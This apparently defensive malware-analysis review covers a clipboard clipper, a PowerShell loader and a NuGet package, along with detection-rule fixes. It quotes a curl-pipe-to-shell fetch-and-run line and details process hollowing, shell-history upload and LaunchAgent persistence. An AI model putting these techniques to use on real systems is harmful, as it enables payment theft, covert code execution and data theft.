# Registry conviction second review (2026-10-25)

All three original artifacts remain **MALICIOUS**, based on code paths rather
than scanner scores, filenames, registry provenance, or third-party claims.
No external corroboration or deployment circumstances were assumed.

| Artifact | Hostile before/after | Suspicious before/after | ML probability before/after |
| --- | --- | --- | --- |
| clipboard-monitor.py (814847de99da) | 2 / 2 | 3 / 3 | .9975603 / .9975603 |
| NEWSTAND.ps1 (a07462d5fa1c) | 4 / 4 | 4 / 4 | .98 / .98 |
| onyxfieldcraft 3.2.16 nupkg (c672211229eb) | 2 / 2 | 1 / 2 | .9998814 / .99987924 |
| nupkg src/OnyxfieldcraftSyncAgent.cs | 2 / 2 | 1 / 2 | classifier agrees with malicious judgment |
| nupkg README.md and LICENSE (each) | 0 / 0 | 0 / 0 | no attack findings |

`review.json` records every analyzed member/layer, including all three decoded
PowerShell descendants, additions, and emitted-finding differences.

## Behavioral evidence and remaining context

* **Clipboard clipper:** the complete 11-line program immediately enters a
  loop, reads the system clipboard, full-matches ETH and legacy BTC address
  patterns, and substitutes fixed destinations. It repeats every 0.5 seconds.
  There is no user choice, normal clipboard transformation, telemetry, network
  transfer, persistence, or process launch to infer. The fixed BTC address is
  also widely used as example data; that does not explain the second fixed
  destination and automatic substitution loop. Consent/demo context was not
  supplied. Payment redirection tips the judgment. Existing detections already
  cover both address families, reads, writes, conditional replacement, and
  polling; no clipboard rule edit was needed.
* **NEWSTAND loader:** independently decoded its three Base64 here-strings,
  AES-256-CBC decrypted with the supplied key/IV and PKCS7 padding, recovered
  stage1.ps1, XOR-unmasked the managed loader, and extracted the decimal-byte
  native PE. The script executes the plaintext ScriptBlock, waits for absence
  of aspnet_compiler, loads the assembly in memory, resolves FILE.WHORE.LAUNCHER,
  and passes the Framework aspnet_compiler path and native image. CIL tracing
  follows LAUNCHER -> qASnOg2Lc -> the ordered delegate array: create suspended
  process (0x08000004 flags), parse PE headers, get CONTEXT, inspect/unmap the
  original image, reserve/commit RWX remote memory (0x3000/0x40), write headers
  and sections, rewrite PEB.ImageBaseAddress and saved EAX to the new entry,
  set CONTEXT, then resume. Failure kills the created child and retries.
  This concealed image-replacement chain supports malicious intent without
  identifying the ultimate payload family or executing it. Its native image
  begins with a position-relative call/pop trampoline: follow e_lfanew at
  +0x3c and AddressOfEntryPoint at NT+0x28, then jump to image base+RVA.
  Added that missing neutral execution capability. The native stage remains
  heavily obscured; no unsupported C2, credential theft, or payload-family
  claim was added.
* **Onyxfieldcraft SyncAgent 3.2.16:** inspected all five archive entries and
  source (no compiled assembly, install hook, or automatic caller is shipped).
  InstallAgentAsync returns unless an environment variable is present, then
  writes a user LaunchAgent with RunAtLoad and a 900-second interval and calls
  launchctl load -w. Its ProgramArguments invoke bash -lc with a remote-shell
  pipeline. Critically, the nested `/bin/sh -c curl -fsSL URL | sh` does not
  quote the inner command: `curl` is the inner command string, `-fsSL` becomes
  its $0 and URL its $1. Thus the intended download likely fails; no remote
  payload was fetched or executed during review. Independently, File.OpenRead
  opens ~/.zsh_history and that exact stream enters StreamContent/PostAsync
  to the hardcoded HTTPS relay. No helper purpose explains exporting shell
  history alongside recurring remote-shell staging. Invocation, environment
  gate state, consent and successful network/service operation are unknown.

The clipboard and NuGet samples stay below the 3-hostile-trait target because
there are no further distinct supported hostile behaviors to add: clipboard
payment redirection, and NuGet history export plus recurring activation,
respectively. The remote execution primitive is already covered and is dual
use in isolation; its argument error is not a new attack. No detection work
was blocked by a matcher limitation. Adding redundant hostiles would inflate
coverage. The new suspicious NuGet trait describes the bound history stream
and declared shell job; the retained hostile consumer supplies the original
capability evidence. The C# flow producer loses local bindings/constructor
names, so a syntactic binding query is used instead.

## Corrections and regression evidence

The old launchagent-history-stream-post required a nearby history path and
file-open/POST operations, without proving that the history stream was sent.
Before narrowing, HEAD's actual rules matched **both hostile objectives** on
unrelated-file.cs, unrelated-stream.cs, and reassigned-stream.cs. These are
explicit counterexamples to its history-export claim, not reasons to suppress
all remote shell jobs. The generic open/POST co-occurrence rule is unchanged.
The new query binds path -> File.OpenRead -> stream -> StreamContent in
adjacent statements, with the remote command interpolated into the recurring
job. It uses no package name, chosen label, endpoint, variable name, or
activation token. The original hostile ID and its persistence consumer remain.
Two connected variants (including renamed variables and .bash_history) still
match; four boundary controls do not. Other suspicious remote-shell capability
findings remain on disconnected-upload controls.

Inspected both exact consumers (the hostile persistence rule and the revised
history rule), existing testdata/taxonomy/dotnet-openread controls, and extracted
LaunchAgent sources from the out-of-batch amberutils DNS-SRV and basaltworks
shutdown packages. They do not acquire a history-export finding. The existing
source archive positive still has both hostile findings. Native trampoline
matching was checked against the real extracted PE and a one-byte near miss
that changes the header-field offset from 0x28 to 0x2c; only the former matches.

Corrected `login-auth-or-history-file-reference`'s description: known_hosts,
authorized_keys, and shell history references do not establish "secret files."
Its matcher, severity, consumers, and supported underlying observations remain.

No material attack coverage was lost. Some optional generic summaries and
component syntax clues cease surfacing in Atomscan's reduced report. Full-ID
`cleave test-rules` confirms the authentication/history, response-acquisition,
and two process-creation summaries still match, and explicitly identifies them
as filtered any/needs<=1 summaries. Their specific path, curl, Process.Start,
service, and upload observations remain. No supported matcher was removed to
manipulate scores. All three classifiers agree with the verdicts. The installed
model reports feature-spec v18 versus engine expectation v21; no classifier
miss was exposed for these originals.

Run the focused source checks without executing the fixtures:

```
python3 testdata/taxonomy/launchagent-history-stream-binding/check.py
```

Raw before/after scans, facts, decrypted stages, complete CIL disassembly,
original-rule snapshot, and control results are retained in the task scratch
folder `acquit-second-814-a074-c672`. Marker contents (commit-body lines):

```
Clipboard clipper: fixed BTC/ETH swaps redirect payments
NEWSTAND loader: AES/XOR stages hollow aspnet_compiler
Onyxfieldcraft 3.2.16: uploads shell history; shell autorun
```
